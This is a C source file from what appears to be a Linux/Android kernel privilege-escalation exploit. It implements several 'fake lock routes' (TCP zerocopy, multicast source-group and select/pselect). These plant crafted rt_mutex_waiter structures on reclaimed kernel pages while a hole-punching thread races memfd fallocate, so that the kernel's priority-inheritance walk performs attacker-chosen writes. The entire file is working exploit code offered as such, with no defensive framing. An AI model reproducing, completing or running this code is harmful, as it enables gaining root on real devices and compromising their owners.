#include "common.h"
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#ifndef TCP_ZEROCOPY_RECEIVE
#define TCP_ZEROCOPY_RECEIVE 5
#endif
#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

int route_last_step;
int route_last_errno;

/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
/* caps a route that never wins so a lost run does not spend the app timeout */
#define TCP_ROUTE_ATTEMPTS 128
#define TCP_ARM_SEQ 16
#define TCP_POST_GETSOCKOPT_HOLD 20000
/* compact pselect retry */
#define PSELECT_CFI_ROUTE_ATTEMPTS 4

struct tcp_punch_state {
  int fd;
  size_t page_size;
};

static atomic_int tcp_punch_go;
static atomic_int tcp_punch_stop;
static atomic_int tcp_punch_phase;
/* errno of the first puncher fallocate that failed; 0 while healthy */
static atomic_int tcp_punch_failed;
static int pre_client_fd = -1;
static int pre_server_fd = -1;
static int pre_punch_fd = -1;
static void *pre_map = MAP_FAILED;
static size_t pre_page_size;
static struct tcp_punch_state pre_punch_state;
static pthread_t pre_puncher;
static int pre_puncher_started;

static void *tcp_punch_thread(void *arg);

int observe_preinit(void) {
  if (pre_client_fd >= 0) {
    return 0;
  }
  if (tcp_make_pair(&pre_client_fd, &pre_server_fd) != 0) {
    pr_error("observe preinit pair errno=%d\n", errno);
  }
  pre_page_size = (size_t)sysconf(_SC_PAGESIZE);
  pre_punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
  if (pre_punch_fd < 0 ||
      fallocate(pre_punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
    pr_error("observe preinit memfd/fallocate errno=%d\n", errno);
  }
  pre_map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
                 MAP_SHARED, pre_punch_fd, 0);
  if (pre_map == MAP_FAILED) {
    pr_error("observe preinit mmap errno=%d\n", errno);
  }
  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += pre_page_size) {
    ((char *)pre_map)[off] = 0x55;
  }
  pre_punch_state.fd = pre_punch_fd;
  pre_punch_state.page_size = pre_page_size;
  atomic_store(&tcp_punch_stop, 0);
  atomic_store(&tcp_punch_phase, 0);
  atomic_store(&tcp_punch_failed, 0);
  if (pthread_create(&pre_puncher, NULL, tcp_punch_thread, &pre_punch_state) != 0) {
    pr_error("observe preinit puncher errno=%d\n", errno);
  }
  pre_puncher_started = 1;
  pr_info("observe preinit ok client=%d server=%d map=%p page=%zu\n",
          pre_client_fd, pre_server_fd, pre_map, pre_page_size);
  return 0;
}

void observe_cleanup(void) {
  /* original binary writes stop signals before joining the puncher thread,
     otherwise the mcast path never sets tcp_punch_stop and the join hangs */
  atomic_store(&tcp_punch_go, 0);
  atomic_store(&tcp_punch_stop, 1);
  if (pre_puncher_started) {
    pthread_join(pre_puncher, NULL);
    pre_puncher_started = 0;
  }
  if (pre_map != MAP_FAILED) {
    munmap(pre_map, TCP_PUNCH_SHMEM_LEN);
    pre_map = MAP_FAILED;
  }
  if (pre_client_fd >= 0) { close(pre_client_fd); pre_client_fd = -1; }
  if (pre_server_fd >= 0) { close(pre_server_fd); pre_server_fd = -1; }
  if (pre_punch_fd >= 0) { close(pre_punch_fd); pre_punch_fd = -1; }
}

int walk_log_enabled(void) {
  const char *s = getenv("GHOSTLOCK_WALK_LOG");
  return s && *s && !(s[0] == 0 && s[1] == 0);
}

int observe_enabled(void) {
  const char *s = getenv("GHOSTLOCK_OBSERVE");
  return s && *s && !(s[0] == '0' && s[1] == '\0');
}

int observe_puncher_ready(void) {
  return pre_puncher_started;
}

static void tcp_wait_for_consumer_idle(void) {
  atomic_store(&punch_consume_go, 0);
  while (atomic_load(&consumer_inflight)) {
    __asm__ volatile("yield" ::: "memory");
  }
}

int tcp_make_pair(int *client_fd, int *server_fd) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) {
    return -1;
  }
  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (*client_fd < 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }
  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    int saved = errno;
    close(*client_fd);
    close(listener);
    errno = saved;
    return -1;
  }

  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  int saved = errno;
  close(listener);
  if (*server_fd < 0) {
    close(*client_fd);
    errno = saved;
    return -1;
  }
  return 0;
}

static void *tcp_punch_thread(void *arg) {
  disable_rseq_for_thread();
  struct tcp_punch_state *state = arg;
  while (!atomic_load(&tcp_punch_go) && !atomic_load(&tcp_punch_stop)) {
    sched_yield();
  }
  while (!atomic_load(&tcp_punch_stop)) {
    if (fallocate(state->fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch fill errno=%d\n", errno);
      break;
    }
    atomic_store(&tcp_punch_phase, 1);
    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)state->page_size,
                  TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
      /* without the hole the target page keeps stale contents and the
       * zerocopy write misses */
      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch hole errno=%d\n", errno);
    }
    atomic_store(&tcp_punch_phase, 0);
    if (atomic_load(&tcp_punch_failed)) {
      break;
    }
  }
  return NULL;
}

int mcast_route_selected(void) {
  const char *route = getenv("GHOSTLOCK_ROUTE");
  if (route && *route) {
    return strcmp(route, "mcast") == 0;
  }
  const char *mcast = getenv("GHOSTLOCK_MCAST_ROUTE");
  return mcast && *mcast && !(mcast[0] == '0' && mcast[1] == '\0');
}

/* MCAST_JOIN_SOURCE_GROUP feeds a raw 264-byte u64 slot table into
 * ip_mc_source(); the kernel reads fixed slots and walks the fake PI waiter
 * planted on the reclaimed page. Mirrors base(1) waiter_thread mcast body:
 * per-round full zero + 7 slot writes, arm from seq 16 on ret==0 or
 * EADDRNOTAVAIL(99), seq log on (i & 0xf) == 0 or errno == 99. */
void do_mcast_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 50;
    route_last_errno = 0;
    pr_warning("mcast route missing page=%016zx lock=%016zx fops=%016zx\n",
               page_base, fake_lock, fake_fops);
    return;
  }

  int client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (client_fd < 0) {
    route_last_step = 51;
    route_last_errno = errno;
    pr_warning("mcast route socket errno=%d\n", errno);
    return;
  }

  int observe = observe_enabled();

  atomic_store(&punch_consume_stop, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, 0);

  uint64_t relink_pc = fake_right ? fake_right : fake_parent;
  uint64_t relink_left = fake_right ? pselect_custom_target : 0;
  uint64_t wake_prio = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;

  int arm_seq = TCP_ARM_SEQ;
  int post_hold = TCP_POST_GETSOCKOPT_HOLD;
  int route_ok = 0;

  pr_info("mcast route enter observe=%d page=%016zx lock=%016zx "
          "task=%016zx pc=%016zx left=%016zx attempts=%d arm=%d hold=%d\n",
          observe, page_base, fake_lock, fake_task, fake_w0,
          pselect_custom_target, TCP_ROUTE_ATTEMPTS, arm_seq, post_hold);
  fflush(stdout);
  fsync(1);

  uint64_t opt[33];
  for (int i = 1; i <= TCP_ROUTE_ATTEMPTS; i++) {
    int calls_before = atomic_load(&consumer_calls);
    int success_before = atomic_load(&consumer_success);
    __builtin_memset(opt, 0, sizeof(opt));
    opt[12] = relink_pc;
    opt[14] = relink_left;
    opt[15] = relink_pc;
    opt[17] = relink_left;
    opt[18] = fake_task;
    opt[19] = fake_lock;
    opt[20] = wake_prio;
    errno = 0;
    int ret = setsockopt(client_fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP,
                         opt, sizeof(opt));
    int saved_errno = errno;

    if (observe) {
      pr_info("obs seq=%d ret=%d errno=%d\n", i, ret, saved_errno);
      if (i >= 32) {
        break;
      }
      continue;
    }

    if (i >= arm_seq && (ret == 0 || saved_errno == EADDRNOTAVAIL)) {
      atomic_store(&punch_consume_go, i);
      for (int spin = 0; spin < post_hold; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
      tcp_wait_for_consumer_idle();
    }

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    if (calls > calls_before && success > success_before) {
      pr_info("mcast route won seq=%d\n", i);
      route_ok = 1;
      route_last_step = 0;
      route_last_errno = 0;
      break;
    }
    if ((i & 0xf) == 0 || saved_errno == EADDRNOTAVAIL) {
      pr_info("mcast route seq=%d ret=%d errno=%d calls=%d success=%d\n",
              i, ret, saved_errno, calls, success);
    }
    if (i > TCP_ROUTE_ATTEMPTS - 1) {
      break;
    }
  }

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  close(client_fd);
  if (!(route_ok | observe | route_last_step)) {
    route_last_step = 52;
  }
  pr_info("mcast route done=%d observe=%d calls=%d success=%d step=%d "
          "errno=%d\n",
          route_ok, observe, atomic_load(&consumer_calls),
          atomic_load(&consumer_success), route_last_step,
          route_last_errno);
  fflush(stdout);
  fsync(1);
}

void do_tcp_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 40;
    route_last_errno = 0;
    pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int client_fd = -1;
  int server_fd = -1;
  int punch_fd = -1;
  char *map = MAP_FAILED;
  pthread_t puncher;
  int puncher_started = 0;
  int route_ok = 0;

  if (tcp_make_pair(&client_fd, &server_fd) != 0) {
    route_last_step = 41;
    route_last_errno = errno;
    pr_warning("tcp route pair setup failed errno=%d\n", errno);
    return;
  }

  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
  if (punch_fd < 0 ||
      fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
    route_last_step = 42;
    route_last_errno = errno;
    pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
    goto out;
  }
  map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
             MAP_SHARED, punch_fd, 0);
  if (map == MAP_FAILED) {
    route_last_step = 43;
    route_last_errno = errno;
    pr_warning("tcp route mmap errno=%d\n", errno);
    goto out;
  }
  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
    map[off] = 0x55;
  }

  struct tcp_punch_state state = {.fd = punch_fd, .page_size = page_size};
  /* clear before the thread can start */
  atomic_store(&tcp_punch_stop, 0);
  atomic_store(&tcp_punch_phase, 0);
  atomic_store(&tcp_punch_failed, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  if (pthread_create(&puncher, NULL, tcp_punch_thread, &state) != 0) {
    route_last_step = 44;
    route_last_errno = errno;
    pr_warning("tcp route punch thread errno=%d\n", errno);
    goto out;
  }
  puncher_started = 1;

  /* waiter->task carries init_task's phys alias, not the image address */
  uintptr_t waiter_task = SLIDE_INIT_TASK;
  int arm_seq = TCP_ARM_SEQ;
  int post_hold = TCP_POST_GETSOCKOPT_HOLD;

  pr_info("tcp route enter observe=%d pre=%d page=%016zx fake_lock=%016zx "
          "fake_w0=%016zx fake_task=%016zx task=%016zx attempts=%d "
          "arm=%d hold=%d\n",
          observe_enabled(), observe_puncher_ready(), page_base, fake_lock,
          fake_w0, fake_task, waiter_task, TCP_ROUTE_ATTEMPTS, arm_seq,
          post_hold);

  atomic_store(&tcp_punch_go, 1);
  /* custom-write mode: fire the PI walk immediately */
  atomic_store(&main_route_delay_usec, 0);

  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));

  for (int i = 1; i <= TCP_ROUTE_ATTEMPTS && !route_ok; i++) {
    int calls_before = atomic_load(&consumer_calls);
    int success_before = atomic_load(&consumer_success);
    (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
    while (atomic_load(&tcp_punch_phase)) {
      sched_yield();
    }
    for (int spin = 0;
         !atomic_load(&tcp_punch_phase) && !atomic_load(&tcp_punch_failed) &&
         spin < 10000000;
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&tcp_punch_failed)) {
      route_last_step = 46;
      route_last_errno = atomic_load(&tcp_punch_failed);
      pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
      break;
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    uint64_t addr = (uint64_t)(uintptr_t)(map + page_size);
    uint32_t cblen = (uint32_t)sizeof(sendbuf);
    uint32_t flags = 0;
    uint64_t msg_control = 0;
    uint32_t msg_clen = 0;
    int task_ok = waiter_task != 0;
    int lock_ok = fake_lock != 0;
    put64(zc, 0x18, addr);
    put32(zc, 0x20, cblen);
    put64(zc, 0x28, waiter_task);
    put64(zc, 0x30, fake_lock);

    socklen_t len = sizeof(zc);
    errno = 0;
    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
                         &len);
    int saved_errno = errno;
    /* release the consumer only once the zerocopy write landed in the
     * waiter frame; earlier release walks a half-written waiter */
    if (i >= arm_seq && ret == 0) {
      atomic_store(&punch_consume_go, i);
      for (int spin = 0; spin < post_hold; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
      tcp_wait_for_consumer_idle();
    }

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    if (calls <= calls_before || success <= success_before) {
      if (observe_enabled()) {
        pr_info("obs seq=%d ret=%d errno=%d len=%u addr=%016zx cblen=%u "
                "flags=%08x msg_control=%016zx msg_clen=%016zx task_ok=%d "
                "lock_ok=%d\n",
                i, ret, saved_errno, len, (size_t)addr, cblen, flags,
                (size_t)msg_control, (size_t)msg_clen, task_ok, lock_ok);
      }
      if ((i % 100) == 0 || ret != 0) {
        pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                "success=%d\n",
                i, ret, saved_errno, len, calls, success);
      }
      continue;
    }
    /* consumer fired: the PI walk derefed the crafted waiter and wrote.
     * stages verify their own effects; no cfi stage here. */
    pr_info("tcp route won seq=%d\n", i);
    route_ok = 1;
    route_last_step = 0;
    route_last_errno = 0;
  }

out:
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&tcp_punch_go, 0);
  atomic_store(&tcp_punch_stop, 1);
  if (puncher_started) {
    pthread_join(puncher, NULL);
  }
  if (map != MAP_FAILED) {
    munmap(map, TCP_PUNCH_SHMEM_LEN);
  }
  if (punch_fd >= 0) {
    close(punch_fd);
  }
  if (server_fd >= 0) {
    close(server_fd);
  }
  if (client_fd >= 0) {
    close(client_fd);
  }
  if (!route_ok && route_last_step == 0) {
    route_last_step = 45;
  }
  pr_info("tcp route done=%d observe=%d calls=%d success=%d step=%d "
          "errno=%d\n",
          route_ok, observe_enabled(), atomic_load(&consumer_calls),
          atomic_load(&consumer_success), route_last_step,
          route_last_errno);
}

static int route_delay_usec(int attempt) {
  if (!(active_offsets && active_offsets->compact_waiter)) {
    (void)attempt;
    /* let select set up its stack frame before the PI walk */
    return PSELECT_ENTER_DELAY_USEC;
  }
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    long value = strtol(forced, &end, 0);
    if (end != forced && !*end && value >= 0 && value <= 2000000) {
      return (int)value;
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };
  return delays[(attempt - 1) % 8];
}

static void compact_timeout_values(long *sec, long *usec) {
  *sec = 1;
  *usec = 0;
  const char *s = getenv("PSELECT_TIMEOUT_OVERRIDE_USEC");
  if (!s || !*s) {
    return;
  }
  char *end = NULL;
  errno = 0;
  long value = strtol(s, &end, 0);
  if (!errno && end != s && !*end && value >= 0) {
    *sec = value / 1000000;
    *usec = value % 1000000;
  }
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(void) {
  return active_offsets ? active_offsets->pselect_waiter_shift
                        : PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  /* every bit lands on the read end so select/pselect parks the full window */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static int standard_io_backup[3] = {-1, -1, -1};

void reserve_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] >= 0) continue;
    int backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
    if (backup < 0) {
      pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
    } else {
      standard_io_backup[fd] = backup;
    }
  }
}

static void restore_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] < 0) continue;
    dup2(standard_io_backup[fd], fd);
  }
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  int compact = active_offsets && active_offsets->compact_waiter;

  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  if (compact) {
    /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
     * the write value, children the write target; waiter->task is the
     * payload fake_task (planted fields for the PI walk). Value writes relink
     * left-only at the target, or the erase rebalance walks the target page. */
    uint64_t relink_pc = fake_right ? fake_right : fake_parent;
    uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
    struct pselect_waiter_word words[] = {
      {2, relink_pc, "tree_pc"},
      {3, 0, "tree_right"},
      {4, relink_left, "tree_left"},
      {5, relink_pc, "pi_pc"},
      {6, 0, "pi_right"},
      {7, relink_left, "pi_left"},
      {8, fake_task, "task"},
      {9, fake_lock, "lock"},
      {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  } else {
    /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 1, "tree_prio"},
      {6, 0, "tree_deadline"},
      {7, 0, "pi_parent"},
      {8, 0, "pi_right"},
      {9, 0, "pi_left"},
      {10, 1, "pi_prio"},
      {11, 0, "pi_deadline"},
      {12, fake_task, "task"},
      {13, fake_lock, "lock"},
      {14, 3, "wake_state"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 30;
    route_last_errno = 0;
    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int pipefd[2];
  SYSCHK(pipe(pipefd));

  int compact_route = active_offsets && active_offsets->compact_waiter;
  int attempts = compact_route ? PSELECT_CFI_ROUTE_ATTEMPTS : 1;
  long compact_timeout_sec;
  long compact_timeout_usec;
  if (compact_route) {
    compact_timeout_values(&compact_timeout_sec, &compact_timeout_usec);
  }

  int calls = 0;
  int success = 0;
  int winner = 0;
  int leak_fds = 0;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    if (compact_route && attempt > 1) {
      /* lost race clobbers the page, respray re-derives fake_* too */
      page_base = prepare_good_kernel_page();
      if (!page_base || !fake_lock || !fake_fops) {
        route_last_step = 35;
        route_last_errno = errno;
        pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
        break;
      }
    }

    /* park on a never-ready timerfd so the waiter stays stale on the
     * pselect stack for the consumer window */
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      route_last_step = 31;
      route_last_errno = errno;
      pr_warning("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      return;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            attempt, attempts, pselect_waiter_shift(),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    log_sync();

    /* The route may replace low fds, including stdout and stderr. */
    reserve_standard_io();
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    close(high_read);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, attempt);

    pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0));
    errno = 0;
    int ret;
    if (compact_route) {
      struct timespec ts = {
        .tv_sec = compact_timeout_sec,
        .tv_nsec = compact_timeout_usec * 1000,
      };
      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
    } else {
      /* non-compact stays on select with its 200ms timeout */
      struct timeval timeout = {
        .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
        .tv_usec = PSELECT_TIMEOUT_USEC,
#else
        .tv_usec = 0,
#endif
      };
      ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    }
    int saved_errno = errno;
    restore_standard_io();
    pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);

    /* RMGP pattern, wait out the consumer before closing the fds. The PI walk
     * runs on its CPU with the crafted waiter on the stack */
    int consumer_stuck = 0;
    if (atomic_load(&consumer_inflight) != 0) {
      for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
        usleep(1000);
      }
      consumer_stuck = atomic_load(&consumer_inflight) != 0;
    }

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d/%d ret=%d errno=%d calls=%d "
            "success=%d delay=%d\n",
            attempt, attempts, ret, saved_errno, calls, success, delay_usec);

    if (calls > 0 && success > 0) {
      route_last_step = 0;
      route_last_errno = 0;
      winner = 1;
    } else {
      route_last_step = 33;
      route_last_errno = saved_errno;
    }

    /* open_selected_fds only closes its own F_DUPFD copy */
    if (consumer_stuck) {
      /* stuck in sched_setattr or futex, closing would reclaim objects its
       * syscall still uses, leak and let process exit reclaim them */
      route_last_step = 34;
      pr_warning("pselect consumer still inflight, leaking route fds\n");
      leak_fds = 1;
      break;
    }
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }

    if (winner) {
      break;
    }
  }

  if (!leak_fds) {
    close(pipefd[0]);
    close(pipefd[1]);
  }

  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, route_last_step, route_last_errno);
}

